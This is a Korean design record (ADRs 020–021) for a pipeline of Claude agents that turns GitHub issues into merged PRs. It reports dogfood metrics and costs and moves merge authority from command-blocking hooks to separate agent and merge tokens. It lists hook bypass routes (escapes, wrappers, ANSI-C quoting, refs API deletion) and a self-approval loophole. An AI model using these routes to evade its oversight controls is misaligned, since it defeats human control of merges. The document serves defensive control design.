**관측**: 라운드 3에서 KTB-13 수정을 실어 나르는 `factory init --upgrade` PR이 데모 #2의 implement가 **도는 중에** 머지됐다. base가 런 밑에서 움직였고, 그 런의 게이트·프롬프트·훅이 어느 버전의 것인지가 사후에 불분명해졌다 — 실패를 어느 커밋 탓으로 돌릴지 판단할 수 없다.

**결정(운영 규칙)**: 대상 저장소의 팩토리 업그레이드(`init --upgrade` 머지)는 **돌고 있는 스테이지가 없을 때만** 한다. 자동화된 가드는 두지 않는다 — 업그레이드 PR은 보호 경로를 건드리므로 어차피 사람이 머지하고(ADR-020 KTB-5), 그 사람이 `factory:in-progress`/`awaiting-review` 이슈가 있는지 보면 된다. 이 규칙을 문서에 못 박는 이유는 라운드 3에서 그것을 보지 않고 머지했기 때문이다.

#### G1 — `[runtime].setup`으로 Node 외 툴체인(Flutter 등)을 깔 수 있는가 (own-calendar 준비에서 발견한 설계 공백)

**질문**: 러너 셋업(`templates/factory/factory/actions/setup/action.yml`)은 `actions/setup-node` +
`[runtime].setup`(`.factory/bin/setup-env.js`가 `harness.toml`에서 읽어 실행)만 돈다. Flutter나 Python처럼
Node가 아닌 툴체인이 필요한 저장소는 그것을 표현할 자리가 없다. 최소로 여는 방법은 무엇이고, 기존 구조에
그것을 막는 것이 있는가.

**결정**: 전용 `[runtime].actions` 메커니즘(임의 다중 설치 스텝)은 지금은 만들지 않는다(범위 초과, 나중으로
미룬다) — 대신 `[runtime].setup` 한 줄에 툴체인 설치 + `$GITHUB_PATH` 확장을 표현하는 것을 **정식 경로**로
문서화하고 그것이 실제로 동작함을 고정한다.

1. **`[runtime].setup`을 자기만의 액션 스텝으로 분리했다**(`.factory/actions/setup/action.yml`). 기존에는
   `npm install --prefix .factory`·`git config`와 같은 `run:` 블록 안에서 돌고 있었다 — 동작 자체는 GitHub
   Actions의 "$GITHUB_PATH 추가는 그것을 쓴 스텝이 아니라 **다음** 스텝부터 반영된다"는 규칙 때문에 이미
   합류 지점(Claude/test-env 설치, 그리고 이 composite action을 부른 워크플로의 게이트 스텝) 전에 최소 한
   스텝을 거치므로 틀리지는 않았지만, 다른 명령과 같은 스텝에 있으면 그 사실이 파일만 보고는 드러나지
   않는다. 스텝을 쪼개 `[runtime].setup`이 하는 일과 그 경계를 파일 자체가 말하게 했다.
2. **`harness.toml`에 `setup_note` 주석**을 추가해(TOML 파서는 무시하는 순수 문서) `[runtime].setup`이
   저장소 루트에서, 자기만의 액션 스텝(`bash -e`)으로, `$GITHUB_PATH`/`$GITHUB_ENV`를 쓸 수 있는 채로
   실행된다는 계약과 Flutter 설치 예시(`curl … | tar -xJ` + `echo … >> "$GITHUB_PATH"`)를 남겼다.
3. 테스트: `yml-lint.test.js`(setup-env.js 호출이 npm install/git config/`if: always()`와 섞이지 않은
   독립 스텝임을 고정) · `templates.test.js`(`setup_note`가 `$GITHUB_PATH`·"own step"·Flutter 예시를 담고,
   TOML 파싱은 그대로임을 고정).

**알려진 한계**: 이것으로 여는 것은 "한 줄짜리 셸 명령으로 표현 가능한 설치"뿐이다. 여러 스텝의 캐싱(예:
Flutter SDK를 `actions/cache`로 재사용)이나 스텝별 `if:` 조건처럼 진짜 다중-액션이 필요해지면, 그때
`[runtime].actions`(스텝 목록) 같은 정식 메커니즘을 다시 본다 — 지금은 마주친 요구(툴체인 설치 + PATH
확장)를 채우는 가장 작은 변경만 했다.

### 라운드 3 관측 사실 (ADR 근거로 고정 — 아래 "표본과 지표"의 실측 출처)

dogfood 라운드 3에서 관측자가 확인한 것 중 **판결의 근거로 남겨야 하는** 사실들:

- **비용.** #2 plan $12.43 + #2 implement $8.13 + #8 plan $7.78 + #8 implement $17.07 + #8 review $11.33 ≈ **$56.7**(triage 2건 별도), 그리고 KTB-16이 태운 #2 plan 재실행 **$12.05**. 가장 비싼 두 스테이지(implement $17.07 · review $11.33)의 비용 상당 부분이 KTB-12/13의 권한 우회(Bash 209회·245회)에서 나왔다 — 방벽을 잘못 세우면 비용으로 되돌아온다는 것의 실측이다.
- **훅이 권한 판정보다 먼저 발화한다 — 실물로 확인.** #8 review의 서브에이전트 트랜스크립트 16개 집계: `tool_use {Bash:245, Read:47, StructuredOutput:18, Write:1, Workflow:1}`, hook-blocked **36** · dontAsk-denied **57**. 차단 메시지는 일반적인 dontAsk 문구가 아니라 `PreToolUse:Bash hook error: [.claude/hooks/deny-all-writes.sh]: factory: this role must not write (bash: redirection to a path outside /tmp, $TMPDIR or .factory/out/qa/)`였다. KTB-13이 "PreToolUse 훅은 permission 판정보다 **먼저** 돌고 exit 2가 호출 자체를 차단하므로 전역 allow가 넓어져도 리뷰어는 쓸 수 없다"고 쓴 문장이 **이제 관측으로 뒷받침된다**(그전까지는 스파이크 추론이었다).
- **R1→R2 verdict 뒤집힘: 표본 0.** #8 review의 R1이 만장일치 approve(correctness·architecture·spec-conformance·qa 전부 approve/high)라 rework 라운드가 없었다. §12.4의 뒤집힘 지표는 라운드 3에서도 표본이 없다 — 세 라운드 연속이다. 이 지표는 아직 "측정되지 않았다"이지 "0이다"가 아니다.

### 표본과 지표 (최종 — Task 7 part 2, 2026-09-14 01:20 KST / 2026-09-13 16:20Z 마감)

스펙 §12.4의 네 기준을 실측으로 채운다. 마감 시점의 표본은 **데모 5건**(#2·#8·#14 프로브·#15·#18)이다 — own-calendar 3건과 KTB 자기 원격 실행은 PARKED(사용자 조치)라 표본에 들어오지 못했고, 데모 잔여 #5/#6/#7은 **비용 규칙**(아래)으로 투입하지 않았다. 관찰은 라운드 11(#2가 KTB-29의 K=3 상한으로 `needs-human`에 도달한 시점)에서 닫았다.

| 지표(§12.4) | 라운드 3 시점 실측 | 최종(part 2) |
|---|---|---|
| 이슈 → 머지 무개입 완주율 (표본 20건 목표, ≥80%) | 데모 1/2 완주(#8 성공, #2 미완주) — **표본 크기 자체가 1.0 기준에 못 미쳐 측정 불가**(아래 캐비엇) | **머지 1 / 파이프라인 진입 4**(프로브 #14 제외): #8만 머지됐고, 그마저 merge 스테이지에서 사람이 2회 재시도했으므로 **엄밀한 "무개입" 완주는 0/4**. #2는 K=3 상한(3 approve / 1 reject)에서, #18은 429·비용 보류에서, #15는 plan 턴 상한에서 `needs-human`. **1.0 기준(≥80%)은 측정 불가이자, 측정됐다면 미달**이다 — 이 숫자는 정직하게 적는다. 다만 완주를 막은 사유의 분포가 판결의 본체다: 코드 품질 0건, 쓰기 채널·의존성·인프라(429/좀비 큐/라벨 유실)·리뷰 진동이 전부다(아래 "대체 판정") |
| 스테이지 건너뛰기 시도(손 라벨) 100% 차단 | **1/1 확정** — 이슈 #14 프로브(`backlog`+손 `factory:approved`, 그리고 단일 손 `approved`): 두 변형 모두 침묵 없이 차단됨(KTB-18 발견·수정 후: 코멘트 + `needs-human`) | **1/1(변형 2/2) 확정.** own-calendar 추가 프로브는 PARKED. 라운드 11의 재리뷰 5회가 훅 층의 우회(토큰 경계·백슬래시·래퍼·ANSI-C 인용)를 잡아 닫았고, 런타임 조립 동사는 비목표로 명시(잔여 위험 #4) |
| 리뷰어 R1→R2 판정 뒤집힘 비율 | **표본 0** — 라운드 1~3 전부 R1 만장일치 approve라 전체 R2 자체가 열리지 않았다(이슈 #8 review 실측: correctness·architecture·spec-conformance·qa 전부 approve/high). "측정되지 않았다"이지 "0이다"가 아니다 | **R1→R2 뒤집힘 5/12 역할(42%)**, 연속 라운드 전체로는 **14/28(50%)**, 그중 approve→reject(퇴행) 6건. 표본: #2 에피소드 1(R1→R2 1/4, R2→R3 1/4), #2 에피소드 3(3/4, 3/4 — correctness가 reject→approve→reject로 **진동**), #18 에피소드 1(1/4, 1/4, R3→R4 4/4). O21의 진동이 수치로 확정됐다: 리뷰가 수렴하지 않는 이슈에서는 K가 물어야 한다(KTB-29, #2에서 라이브 확인) |
| 머지 후 7일 내 revert 0건 | 머지 1건(#8 → PR #10, 2026-09-12 17:07Z) — 7일 관찰 창 진행 중, 현재까지 revert 0 | **0건**(창 2026-09-19 17:07Z까지 진행 중, 마감 시점 0). 머지가 1건뿐이라 지표로서의 힘은 약하다 |
| 비용 합계 | 데모 라운드 1~3 누계 **$81.81**(`factory status`, list-price 환산) + KTB 자기 dogfood 로컬 준비(토큰 소비 0 — 원격 미실행) | **$563.01 / 226 runs**(list-price 환산; 실제로는 구독 토큰): #2 $262.39(80 runs) · #18 $144.79(66) · #15 $119.52(38) · #8 $36.32(39) · #14 $0. 머지 1건당 $563이지만, 그 대부분은 재실행이다 — 조직 월 한도(09-12 20:20Z)·세션 한도 2회(09-13 05:43Z·10:35Z)·GitHub 장애 창(O23)·라벨 유실 3회(KTB-30)로 죽은 스테이지를 다시 돌린 비용. own-calendar·KTB 원격 실행 비용은 0(미실행) |

**대체 판정(계획 Global Constraints의 "완주 ≥ 6/8, 손 라벨 차단 100%, R1→R2 뒤집힘 기록, revert 0")**: 완주 1/8(미달), 손 라벨 차단 100%(충족), 뒤집힘 기록(충족, 50%), revert 0(충족, 창 진행 중). **1.0 성공 기준은 이 표본으로 충족되지 않았다.** 그러나 미달의 원인은 전부 이 dogfood가 찾아 고친 결함(KTB-1~31)과 사용자 계정의 한도이고, 코드가 나빠서 머지되지 못한 이슈는 없다 — #2의 마지막 PR은 실제 Postgres 통합 테스트까지 갖췄고 3/4 리뷰어가 approve했다. 1.0 출시 판단은 사용자의 것이며, 이 ADR은 "표본 5건·완주 1건·결함 31건 수정·이월 4건(KTB-32, O24·O25, 리뷰 R2 생략·이슈당 비용 상한)"을 그 판단의 입력으로 남긴다.

**라이브로 확인된 판결(라운드 9~11)**: KTB-8 stalled 재점화(#2 09:32Z), KTB-22 429 → blocked(#2·#18), KTB-23 pg 있으면 implement 완주(#2), KTB-25 재큐 뒤 round=1(#18·#2), KTB-29 K=3 상한(#2 16:15Z), KTB-30 add-first 스왑(배포 뒤 3시간·전이 12회 동안 라벨 유실 0 — 배포 전 65분 동안 3회). **라이브로 확인 못 한 판결**: L1 보호 경로 머지 거부(#15가 그 앞에서 4번 죽었다 — 단위 테스트만), KTB-28 오래된 락 회수, KTB-31 rework 재점화(배포 뒤 rework 정지가 없었다).

### PARKED (사용자 조치 필요 — 자율로 풀 수 없음)

세 항목 전부 이 세션의 하드 제약(KTB push/merge 금지, 타인 계정 시크릿 미접근)에서 나왔다. ledger(`progress.md`)의 문구를 그대로 옮긴다.

1. **KTB 자기 원격 다크 실행 — 사용자의 push/merge 필요.** "Task 5's dark run — GitHub runs `issues:` workflows from the DEFAULT branch, and KTB's factory files live only on the unpushed `spec/factory-1.0` (user forbids KTB push/merge) → the KTB self-dogfood can only be prepared locally (init/doctor on the branch); the remote run waits for the user to push/merge." 로컬 준비(harness M0·CHARTER ready·`factory init`·전체 doctor·1311 tests)는 `docs/factory/dogfood/2026-09-12-ktb.md`에 완료 기록됨 — KTB-12(`.gitignore`가 디스패처를 통째로 무시)를 이 준비 과정에서 발견·수정했다.
2. **own-calendar 다크 실행 — 사용자의 시크릿 필요.** "Task 6's dark run — own-calendar needs `CLAUDE_CODE_OAUTH_TOKEN` + `FACTORY_BOT_TOKEN` secrets that only the user can set → local prep only (fresh clone in scratchpad, harness draft via the `:harness (b)` procedure, init, `doctor --no-run --offline`), no push." 로컬 준비는 `task-6-prep-report.md`에 DONE_WITH_CONCERNS로 기록됨(harness M1 draft, doctor PASS 49·WARN 4·FAIL 0, KTB-11 발견, G1 설계 공백 발견).
3. **own-calendar는 private + GitHub Free → L0(branch protection) 자체가 불가능.** "Branch protection is unavailable: own-calendar is a private repo on GitHub Free, which doesn't support branch protection rules — so L0 (protected-branch enforcement) is off for this repo. `factory bootstrap`'s branch-protection step will no-op/WARN; the merge stage's own integrity/tamper checks are the only real backstop until/unless the plan upgrades or moves the repo." (KTB-2의 403 처리가 이 케이스에도 그대로 적용된다 — WARN이지 FAIL이 아니다.)

### 표본 크기 캐비엇과 대체 판정 (Global Constraints §12.4 인용)

계획(`docs/superpowers/plans/2026-09-12-factory-plan-6-dogfood.md`) Global Constraints가 미리 정한 대체 판정을 그대로 인용한다 — §12.4의 "≥80% 무개입 완주"는 **이 표본 크기로는 측정할 수 없다**:

> 성공 기준(§12.4): 무개입 완주율 ≥80%(표본은 데모 5건 + own-calendar 3건이면 1.0 기준 미달 — 이 계획에서는 "완주 ≥ 6/8, 손 라벨 차단 100%, R1→R2 뒤집힘 기록, revert 0"으로 대체 판정하고 ADR에 표본 크기를 명시).

이 인용이 이 ADR이 명시해야 할 그 "표본 크기 명시"다: 1.0의 성공 기준은 표본 20건(standard tier)을 전제하는데, Plan 6은 데모 5건(§P6-R2: docs 1·standard 3·flaky 1) + own-calendar 3건(§P6-R4, 병렬)으로 설계됐다 — 8건. 실행은 그중 데모 4건(#2·#8·#15·#18) + 프로브 1건(#14)이 다크 파이프라인에 진입했고(#5/#6/#7은 비용 규칙으로 미투입, own-calendar는 PARKED), 위 표의 두 열이 그 결과다. part 2의 대체 판정은 표 아래에 있다: **완주 1/8로 미달**, 나머지 세 기준 충족.

**비용 규칙(2026-09-13, 사용자)**: 러너의 구독 토큰과 컨트롤러 세션이 같은 한도를 쓰고, 세션 한도에 두 번 닿았다. 그 뒤로 (1) 폴링형 관측자 에이전트를 쓰지 않고, (2) 표본을 늘리지 않으며, (3) 수정 라운드를 묶어 최소화했다. 표본이 5건에서 멈춘 직접 원인이다.

### 1.1 이월 (이 dogfood가 고치지 않고 남긴 것)

1. ~~**KTB-32**~~ — **1.1에서 구현됨**(2026-09-14, 위 KTB-32 항목의 "보강 — 구현"). 번호는 그대로 둔다: 아래 항목들의 번호가 다른 문서에서 인용되고 있다.
2. **O24** — sweeper cron 신뢰 불가: `gh workflow run factory-sweeper.yml`을 사람 도구로 문서화, 스펙에 "cron은 최후 수단".
3. **O25** — `claude -p hit max turns`가 blocked 원인 `timeout`("job timed out")으로 표기된다(#15 plan, 14:26Z). 턴 상한은 잡 타임아웃이 아니다 → `undecidable`/`other`로 분류하고, harness 이슈의 plan에는 더 큰 `factory.max_turns`가 필요하다(KTB-16의 기본값이 harness 워크플로를 쓰는 plan에는 작다).
4. **리뷰 R2 패스 생략** — R1 만장일치 approve면 경량 R2를 돌리지 않는다(이슈당 리뷰 비용의 절반).
5. **이슈당 비용 상한 팔** — 누적 비용이 임계를 넘으면 `needs-human`(#2가 $262까지 간 것을 막는 장치).
6. **M6** — 리뷰 workflow 요약의 "Light/Full round 2"를 "pass 2"로(리뷰 라운드 K와 혼동).
7. **GitHub App 토큰** — `FACTORY_BOT_TOKEN` PAT 발급이 사람 손을 타는 문제.
8. **persist-credentials** — 잠금·records push를 명시 토큰 remote로 옮긴 뒤 `persist-credentials: false`(SF-1의 남은 반).

(ADR-020 끝. 이후 dogfood 라운드가 있으면 새 ADR로 연다.)

---

## ADR-021 머지 권한은 두 배우로 나눈다 — 에이전트가 쥔 토큰으로는 base 브랜치를 머지·push할 수 없다 — 2026-09-14

**질문**: ADR-020 KTB-13(그리고 최종 리뷰 MF-3)은 `gh pr merge`·`git push origin main` 같은 **명령 모양**을 훅(`factory/hooks/block-dangerous.sh`)에서 막는 방식으로 머지 권한을 지켰다. 재리뷰 다섯 회차가 그 훅에서 우회를 계속 찾아냈다 — 토큰 경계, 백슬래시 이스케이프, 인터프리터 래퍼, refs API를 통한 삭제, ANSI-C 인용. 소유자의 판정은 그 목록을 더 늘리는 것이 답이 아니라는 것이었다: "`gh`를 부르는 방법을 전부 열거할 수는 없다 — 명령에 대한 정적 분석으로는 풀리지 않는다. 에이전트가 `gh pr merge`를 실행하더라도, **그가 쥔 토큰에 그 권한이 없어서** 불가능해야 한다." 되돌릴 수 없는 능력(보호된 base 브랜치로의 머지·push)을 에이전트가 도는 **어느 스테이지에서도** 도달 불가능하게 만들되, 다크 머지 자체는 계속 가능하게 하려면 무엇을 바꿔야 하는가.

**관측**:

- **훅은 원리적으로 완결될 수 없다.** 훅이 보는 것은 셸 명령 문자열이고, 같은 API 호출에 도달하는 문자열의 수는 무한하다(래퍼·인코딩·런타임 조립·다른 엔드포인트). ADR-020의 잔여 위험 #4가 "런타임 조립 동사는 비목표"라고 적은 것이 그 사실의 자백이다. 반면 **토큰에 권한이 없으면** 문자열이 무엇이든 GitHub이 거부한다 — 방어의 성질이 "열거"에서 "능력"으로 바뀐다.
- **팩토리는 이미 두 토큰을 위한 자리를 갖고 있었다.** `templates/factory/github/workflows/factory-merge.yml`의 머지 스텝은 `GH_TOKEN: ${{ secrets.FACTORY_MERGE_TOKEN || secrets.FACTORY_BOT_TOKEN }}`으로 부르고 있었다(ADR-015 R2). 그때의 의도는 "상위 토큰을 **쓸 수 있다**"였고, 이번 판결은 그것을 "에이전트 토큰은 그 일을 **할 수 없다**"로 뒤집는다 — 같은 배선, 반대 방향의 불변식이다.
- **GitHub은 자기 PR의 승인을 거부한다**(422 `Can not approve your own pull request`). 이것이 이 설계가 기대는 유일한 GitHub 고유 성질이다: base 브랜치가 승인 1건을 요구하면, PR을 **연** 계정은 그 PR을 머지할 수 없다 — 그 계정의 토큰으로 어떤 명령을 어떻게 조립해도 그렇다. 팩토리의 PR은 언제나 에이전트 배우가 연다(implement 스테이지가 `claude/fq-<issue>`에서 `gh pr create`를 부른다).
- **`restrictions`(push 허용 목록)는 쓸 수 없다.** GitHub Free의 개인 저장소에서는 지원되지 않는다(조직 전용). 대신 `required_pull_request_reviews`가 같은 결과를 낸다 — 그리고 `enforce_admins: true`가 이미 있으므로 머지 배우도 required check를 건너뛰지는 못한다.
- **모드를 사람이 선언하게 하면 안 된다.** "두 배우 모드"를 플래그로 고르게 하면 "선언은 했지만 머지 토큰이 없어 머지가 영영 막힌 저장소"가 가능해진다. 모드는 **관측된 사실**(`gh secret list`에 `FACTORY_MERGE_TOKEN`이 있는가)에서만 나와야 한다.

**결정**: 머지 권한을 **두 배우**로 나눈다.

- **에이전트 배우 = `FACTORY_BOT_TOKEN`** — admin이 아닌 계정(write 권한의 머신 유저, 나중에는 GitHub App)이다. 체크아웃·코멘트·라벨·락 브랜치·PR 생성·`factory/*` 브랜치 push가 전부 이 토큰으로 나간다. `claude -p`가 도는 모든 스테이지가 보는 유일한 자격증명이다.
- **머지 배우 = `FACTORY_MERGE_TOKEN`** — admin/owner PAT(나중에는 bypass 권한의 GitHub App)이다. **스크립트 전용 잡에서만** 등장한다: 머지 스테이지의 `Run stage` 스텝(`claude`를 띄우지 않는다 — `setup`의 `claude: "false"`)과 그 잡의 자격증명 스크럽 스텝뿐이다. 에이전트 스테이지의 `checkout` `token:`에도, 그 스텝들의 env에도 들어가지 않는다(오늘도 들어가 있지 않다 — 그 상태를 **규칙으로** 고정한다). sweeper는 이 토큰을 받지 않는다: sweeper가 하는 일(락 브랜치 삭제 — 보호되지 않은 `refs/heads/factory/lock-*`, 라벨 변경, `workflow run`)은 전부 write 권한으로 충분하고, 필요하지 않은 곳에 admin을 주는 것은 머지 권한이 도는 자리를 하나 늘리는 일이다.

1. **부트스트랩이 모드를 관측하고 보호 규칙을 그에 맞춘다**(`factory/lib/bootstrap.js`). `existing.secrets`에 `FACTORY_MERGE_TOKEN`이 있으면 **두 배우 모드**: base 브랜치에 `required_status_checks = { strict: false, contexts: ["factory/integrity"] }`(그대로) + `enforce_admins: true`(그대로) + `required_pull_request_reviews = { required_approving_review_count: 1, dismiss_stale_reviews: true, require_code_owner_reviews: true }`(마지막 것은 r1 MF-1 — 그리고 그것과 한 쌍인 `.github/CODEOWNERS`를 부트스트랩이 함께 쓴다) + `restrictions: null`, 그리고 `factory-merge` 환경(r1 MF-2 b). 없으면 **단일 배우 모드**: 오늘까지의 보호 규칙 그대로다(승인 요건 없음) — 넣는 순간 에이전트의 PR을 승인해 줄 두 번째 계정이 없어 다크 머지가 구조적으로 불가능해지기 때문이다. 어느 모드로 부트스트랩했는지는 항상 note 한 줄로 출력된다. 메커니즘은 계속 **classic branch protection API** 하나다(ruleset을 섞지 않는다 — 두 메커니즘이 같은 브랜치에 겹치면 어느 쪽이 판정했는지 아무도 말할 수 없다).
2. **머지 스테이지가 승인하고 나서 머지한다**(`factory/lib/merge-stage.js`, 단계 6b). 두 배우 모드에서는 보호 경로·섹션 정책·게이트·필수 체크·무결성이 **전부** 통과한 뒤, `gh pr merge` 직전에 `gh pr review --approve`를 한 번 부른다. 그 호출은 머지 배우의 토큰(`GH_TOKEN`)으로 나가고, PR 작성자는 에이전트 배우이므로 서로 다른 계정이다 — 승인은 유효하다. 자리가 머지 직전인 이유는 `dismiss_stale_reviews: true`다(승인 뒤에 커밋이 들어오면 그 승인은 다른 diff의 것이다). **거부는 `needs-human`이지 `blocked`이 아니다**: 승인이 거부되는 원인(같은 계정, 토큰 스코프 부족, 머지 배우가 협력자가 아님)은 전부 사람이 계정 설정을 고쳐야 풀리고, 같은 호출을 다시 하면 같은 422가 돌아올 뿐이다 — blocked으로 세우면 sweeper와 재시도 경로가 비용만 태우는 루프를 돈다. 단일 배우 모드에서는 이 단계가 통째로 없다(오늘까지의 동작 그대로).
3. **모드는 값이 아니라 불리언으로 옮긴다.** `factory-merge.yml`의 `Run stage` 스텝이 `FACTORY_TWO_ACTOR: ${{ secrets.FACTORY_MERGE_TOKEN != '' }}`를 싣는다 — 시크릿 사본을 env에 하나 더 만들지 않는다(그 사본 자체가 유출면이다). `GH_TOKEN`이 이미 그 토큰이다. 로컬 `factory run merge`나 아직 업그레이드하지 않은 워크플로를 위해 `FACTORY_MERGE_TOKEN`이 env에 직접 있는 경우도 같은 뜻으로 받는다.
4. **`yml-lint`의 새 규칙 `merge-token-scope`가 그 범위를 지킨다**(`factory/lib/yml-lint.js`). 두 갈래다: (a) **파일 범위** — `FACTORY_MERGE_TOKEN`은 `factory-merge.yml`에만 나올 수 있다(파일명을 받은 호출, 곧 doctor의 `checkWorkflows`에서만 판정한다 — `lintWorkflow`는 이름 없는 스니펫도 받는다). **r1 MF-2 d**: `checkWorkflows`는 이제 팩토리의 일곱 이름이 아니라 `.github/workflows/*.yml`을 **디렉터리에서 읽어 전부** 돈다 — 목록에 없는 이름의 워크플로가 머지 토큰을 통째로 실어도 린트가 쳐다보지 않던 구멍을 닫는다. (b) **스텝 범위** — 파일명과 무관하게, 머지 토큰이 `CLAUDE_CODE_OAUTH_TOKEN`/`ANTHROPIC_API_KEY`와 **같은 스텝의 env**에 있으면 위반이다(그 스텝은 `claude -p`가 도는 자리다). 예외는 자격증명 스크럽 스텝 하나다(r1 finding 5 — 그 스텝이 `id: scrub-artifacts`를 **선언하고** 그 블록의 `run:`이 실제로 `scrub-artifacts.js`를 **실행할** 때만. 그리고 템플릿과 설치된 워크플로는 `[protected].factory`(`.github/**`·`templates/**`)라 이 예외를 흉내 내는 스텝을 실은 PR은 **자동 머지되지 않는다** — 사람이 diff를 읽고 머지한다) — 그 스텝은 시크릿을 **쓰려고**가 아니라 아티팩트에서 **리터럴로 지우려고** 받는다(`scrub-artifacts.js`의 `SECRET_ENV`에 `FACTORY_MERGE_TOKEN`을 더했다: 가장 강한 자격증명을 스크럽 목록에서 빼면 그것만 아티팩트에 남는다). 주석은 벗기고 본다 — 이 규칙을 설명하는 주석이 바로 그 파일들 안에 있다.
5. **`factory doctor`가 다섯 줄로 보고한다**(r1 이후 `factory/lib/doctor/merge-authority.js`의 `checkMergeAuthority` — 설치된 트리에서 CI가 부를 수 있도록 `doctor/factory.js`에서 떼어냈다. 아래 셋에 r1이 `protection.codeowners`와 `tokens.agent-workflow-scope`를 더했고, **CI 밖에서의 skip은 PASS가 아니라 WARN**이다). `tokens.two-actor`(PASS) / `tokens.single-actor`(WARN — `merge power is reachable from agent stages; hooks are the only layer (set FACTORY_MERGE_TOKEN + a non-admin FACTORY_BOT_TOKEN for two-actor mode)`), `protection.two-actor`(보호 규칙의 모양이 모드와 맞는가 — 두 배우 모드인데 승인 요건이 없으면 FAIL, 단일 배우 모드인데 승인이 필수면 WARN, 보호 자체가 없거나 플랜이 지원하지 않으면 WARN), `tokens.agent-is-admin`(에이전트 배우의 실제 저장소 권한 — `gh api user`로 로그인 이름을 얻고 `gh api repos/{r}/collaborators/{login}/permission`으로 등급을 묻는다. `admin`/`maintain`이면 두 배우 모드에서 FAIL, 단일 배우 모드에서 WARN). 마지막 것은 **CI에서만** 판정한다(`CI` + `GH_TOKEN`/`FACTORY_BOT_TOKEN`): 사람의 로컬 `gh`는 사람 자신이라 물으면 언제나 admin이고, 그러면 늘 틀린 경보가 된다 — 토큰 없는 환경에서는 건너뛰고 그 사실을 detail로 말한다. 토큰 **값**은 어디에서도 읽지도 찍지도 않는다.

**이제 권한으로 불가능한 것 (에이전트 배우가 쥔 토큰으로는)**:

- **보호된 base 브랜치로의 머지.** `gh pr merge`·`gh api -X PUT …/merge`·GraphQL `mergePullRequest` — 무엇을 어떻게 조립하든 GitHub이 "승인이 없다"로 거부한다. **정확히 말하면 두 문장이다**(r1 finding 9 — 초판은 이것을 뭉뚱그려 과장했다):
  - **에이전트 배우가 연 PR**은 에이전트 배우가 머지할 수 없다 — GitHub이 자기 PR의 승인을 거부하므로(422) 그 승인이 애초에 만들어지지 않는다.
  - **에이전트 배우가 열지 않은 PR**(사람의 PR·`init --upgrade` PR·dependabot·머지 배우의 PR)도 에이전트 배우가 머지할 수 없다 — 단, 그 이유는 자기-승인 금지가 아니라 **코드 오너 요건**이다(r1 MF-1): `require_code_owner_reviews: true` + `.github/CODEOWNERS`의 `* @<머지 배우>`가 그 한 건의 승인을 머지 배우의 것으로 못 박는다. **이 두 설정 중 하나라도 빠지면 이 문장은 거짓이 된다** — 수만 세는 규칙은 "작성자가 아닌 누군가"만 요구하므로 write 협력자인 에이전트 배우가 그 PR의 head에 자기 커밋을 밀어 넣고 스스로 approve한 뒤 머지할 수 있었다(4fa2c7f의 상태).
  - 두 문장 모두 **sweeper의 doctor 스텝이 CI에서 검증한다**(`protection.codeowners`·`tokens.agent-is-admin`·`tokens.agent-workflow-scope`, r1 finding 2). 로컬 doctor는 이 셋을 WARN "unverified until CI"로 남긴다 — 한 번도 평가되지 않은 불변식이 초록으로 보이는 것이 정확히 초판의 결함이었다.
- **보호된 base 브랜치로의 직접 push.** `allow_force_pushes: false` + `required_linear_history` + PR 요건 — 보호 규칙이 admin에게도 걸린다(`enforce_admins: true`).
- **보호 규칙 자체의 수정.** admin이 아닌 계정은 `PUT /repos/{r}/branches/{b}/protection`을 호출할 수 없다. (그래서 `tokens.agent-is-admin`이 FAIL이어야 하는 것이다 — 에이전트 배우가 admin이면 이 줄 전체가 거짓말이 된다.)

**여전히 훅만이 막는 것 (그리고 그것이 깨졌을 때의 복구 팔)**:

- **락 브랜치 삭제** (`refs/heads/factory/lock-<issue>`) — 보호되지 않은 브랜치라 write 권한이면 지울 수 있다. 훅(`block-dangerous.sh`)이 `git push --delete`와 refs API 삭제를 둘 다 막는다. 뚫리면: 다른 러너가 같은 이슈를 동시에 claim할 수 있다. **복구 팔** — claim은 원자적 push라 두 번째 러너가 `{ok:false, holder}`로 fail closed하고, sweeper의 오래된 락 회수(KTB-28)가 고아 락을 치운다. 손실은 중복 실행 한 번의 비용이지 되돌릴 수 없는 변경이 아니다.
- **라벨 편집** — 상태 라벨은 write 권한의 일이다. 훅이 `gh issue edit --add-label`/labels API를 에이전트 세션에서 막는다. 뚫리면: 스테이지를 건너뛰는 손 라벨이 가능하다. **복구 팔** — `transition.js`의 그래프 검사가 handoff·게이트 없는 전이를 거부하고, 그 거부는 코멘트 + `needs-human`으로 남는다(데모 #14 프로브에서 2/2 확인). 머지 자체는 여전히 위 권한 층을 통과해야 한다.
- **`factory/*` 브랜치의 force-push** — 에이전트 브랜치와 `factory/records`는 보호되지 않는다. 뚫리면: 그 브랜치의 히스토리가 다시 쓰인다. **결과** — run 기록은 재생성 가능하고(`hydrateRecord`), 에이전트 브랜치는 PR head sha로 게이트가 묶여 있어 조용한 교체는 required check를 다시 통과해야 한다. base는 영향을 받지 않는다.

**단일 배우 모드로의 퇴화**: `FACTORY_MERGE_TOKEN`이 없는 저장소(두 번째 계정을 만들 수 없거나, own-calendar처럼 branch protection 자체가 불가능한 GitHub Free private 저장소)는 오늘까지의 모습 그대로 돈다 — 보호 규칙에 승인 요건이 없고, 머지 스테이지는 승인 없이 머지하며, **머지 권한이 에이전트 스테이지에서 도달 가능한 채로 남는다**. 그 저장소에서 머지를 막는 유일한 층은 훅이고, 훅은 완결될 수 없다(위 관측). doctor의 `tokens.single-actor` WARN이 그 사실을 매번 이름으로 말한다 — 이 모드는 **틀린 설정이 아니라 알려진 약화**이고, 조용히 지나가는 것만이 틀린 것이다.

**알려진 한계**:

1. **머지 배우의 토큰은 여전히 하나의 시크릿이다.** 머지 잡 안에서 `GH_TOKEN`으로 노출되고, 그 잡에서 도는 것은 팩토리 자신의 스크립트와 **PR이 쓴 게이트 명령**이다. 게이트 하위 프로세스는 `scrubbedRunner`가 env에서 모든 자격증명을 빼고(ADR-020 fix round 1, `MERGE_CAPABLE_ENV`에 `FACTORY_MERGE_TOKEN`이 이미 있다), 보호 경로를 실은 PR은 게이트가 **한 줄도 돌기 전에** 사람에게 넘어간다(KTB-5). 그래도 "머지 잡 안에서 PR의 코드가 돈다"는 사실 자체는 남는다 — 그 창을 완전히 닫으려면 머지를 별도 워크플로(`workflow_run`)로 떼어내야 하고, 그것은 1.1의 일이다.
2. **PAT은 사람 손을 탄다.** 머신 유저 + 두 개의 PAT은 발급·갱신·회수가 전부 수동이다(ADR-020 1.1 이월 7번의 GitHub App이 이 한계의 답이다 — App 설치 토큰은 자동 회전되고 권한이 저장소 단위로 좁다). `FACTORY_TOKEN_ISSUED_AT` + sweeper의 11개월 알림은 `FACTORY_BOT_TOKEN` 하나만 본다.
